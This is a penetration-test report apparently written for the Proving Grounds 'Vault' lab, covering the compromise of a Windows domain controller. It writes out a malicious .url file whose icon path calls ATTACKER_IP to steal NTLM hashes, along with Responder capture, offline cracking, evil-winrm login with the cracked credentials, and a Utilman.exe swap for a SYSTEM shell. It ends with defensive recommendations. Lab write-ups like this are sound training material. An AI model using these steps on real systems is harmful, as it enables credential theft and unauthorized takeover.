# PGP Vault - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-3-5

---

## 0. Lesson Learned

Assume boxes will act like users and click uploaded files to trigger automatic NTLM authentication and hash theft.

Always run `whoami /priv` before uploading winPEAS.

`SeRestorePrivilege` is a simple and extremely powerful privilege escalation vector.

---

## 1. Executive Summary

A penetration test was conducted against the target host as part of a controlled lab environment. The objective was to identify vulnerabilities that could allow unauthorized access and privilege escalation.

Initial enumeration revealed that the target was a Windows Active Directory domain controller exposing several services including SMB, LDAP, Kerberos, and WinRM. During the assessment, an anonymous writable SMB share was discovered. This share was abused to plant a malicious `.url` file that triggered NTLM authentication leakage.

Captured NTLMv2 credentials were cracked offline, revealing valid domain credentials for user `anirudh`. These credentials allowed remote access via WinRM.

Further enumeration of privileges revealed `SeRestorePrivilege`, which was abused to replace the `Utilman.exe` binary with `cmd.exe`, allowing escalation to SYSTEM privileges through the Windows accessibility feature on the login screen.

Full administrative access was obtained, allowing retrieval of both the local user flag and the administrator proof flag.

---

## 2. Scope

- **Target:** 192.168.141.172
- **Environment:** Proving Grounds Practice Vault
- **Testing Window:** 2026-3-4 to 2026-3-5
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

Full TCP Scan:

```
nmap -p- -sCV 192.168.141.172 -T4 -oA vault_tcp
```

Revealing the following open ports:

- 53/tcp - DNS
- 88/tcp - Kerberos
- 135 - RPC
- 139,445/tcp - SMB
- 389/tcp - LDAP
- 464/tcp - Kpasswd
- 636/tcp - LDAPS
- 3268,3269/tcp - Global Catalog
- 3389/tcp - RDP
- 5985/tcp - WinRM

These services indicate the system is functioning as an Active Directory Domain Controller.

---

## 5. Enumeration

LDAP naming contexts were enumerated but further queries failed due to authentication restrictions:

```
ldapsearch -x -H ldap://192.168.141.172 -s base namingcontexts

ldapsearch -x -H ldap://192.168.141.172 -b "DC=vault,DC=offsec" "(objectClass=person)"
```

Anonymous RPC access was denied:

```
rpcclient -U "" -N 192.168.141.172
```

Anonymous SMB enumeration revealed a non-standard share named `DocumentsShare`:

```
smbclient -L //192.168.141.172 -N
```

Connection to the share revealed an empty share with anonymous write access:

```
smbclient //192.168.141.172/DocumentsShare -N
```

Test file uploaded:

```
echo "test" > test.txt

put test.txt
```

---

## 6. Initial Access

Since the share was writeable anonymously, a malicious URL file was created to force authentication to the attacker:

```
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\ATTACKER_IP\%USERNAME%.icon
IconIndex=1
```

Responder was started to capture NTLM authentication:

```
responder -I tun0
```

The malicious file `vault.url` was uploaded to the SMB share:

```
smbclient //192.168.141.172/DocumentsShare -N
put vault.url
```

When the file was accessed by a domain user, NTLMv2 credentials were captured by Responder.

The captured hash was saved locally and cracked with john:

```
john ntlm.hash --wordlists=/usr/share/wordlists/rockyou.txt
```

Recovered credentials:

```
anirudh : SecureHM
```

Credentials were validated with CrackMapExec:

```
crackmapexec winrm 192.168.141.172 -u anirudh -p 'SecureHM'
```

Output indicated successful authentication.

A WinRM shell was obtained:

```
evil-winrm -i 192.168.141.172 -u anirudh -p SecureHM
```

---

## 7. Post-Exploitation

Manual privilege enumeration revealed a dangerous privilege `SeRestorePrivilege` enabled:

```
whoami /priv
```

---

## 8. Privilege Escalation

The `SeRestorePrivilege` was abused by replacing `Utilman.exe` with `cmd.exe`:

```
cd C:\Windows\System32

ren Utilman.exe Utilman.old

ren cmd.exe Utilman.exe
```

RDP was initiated:

```
rdesktop 192.168.141.172
```

At the login screen, pressing `Windows + U` launched a SYSTEM command prompt:

```
whoami

hostname
```

Output confirmed NT AUTHORITY\SYSTEM privileges.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
type C:\Users\anirudh\Desktop\local.txt
```

**Root Flag**: *REDACTED*

```
type C:\Users\Administrator\Desktop\proof.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** Anonymous Writable SMB Share

**Severity:** High

**Description:**
An SMB share allowed anonymous users to write files without authentication.

**Impact:**
Attackers could upload malicious files or tools to the share, potentially enabling credential harvesting attacks or facilitating further compromise.

**Recommendation:**
Disable anonymous access to SMB shares, restrict share permissions to authenticated users, and monitor file shares for unauthorized uploads.

### **Finding:** NTLM Authentication Exposure via SMB Share

**Severity:** High

**Description:**
Users accessing files within the SMB share triggered NTLM authentication attempts that could be captured by attacker-controlled infrastructure.

**Impact:**
Attackers could capture NTLM authentication hashes and attempt relay or offline cracking attacks to gain unauthorized access.

**Recommendation:**
Disable NTLM authentication where possible, enforce SMB signing, and restrict outbound SMB connections to prevent credential relay attacks.

### **Finding:** SeRestorePrivilege Assigned to Non-Administrator Account

**Severity:** Critical

**Description:**
A non-administrative user account possessed the SeRestorePrivilege privilege, allowing modification of protected system files.

**Impact:**
Attackers could abuse this privilege to replace protected files and escalate privileges to SYSTEM.

**Recommendation:**
Restrict SeRestorePrivilege to administrative accounts only, review user privilege assignments regularly, and enforce the principle of least privilege.

---

## 11. Appendix

SeRestorePrivilege Enabled Abuse Documentation -
[https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)

URL IconFile Attack / NTLM Hash Theft - 
[https://xapax.github.io/security/#attacking_active_directory_domain/active_directory_privilege_escalation/ntlm_relaying_and_theft/](https://xapax.github.io/security/#attacking_active_directory_domain/active_directory_privilege_escalation/ntlm_relaying_and_theft/)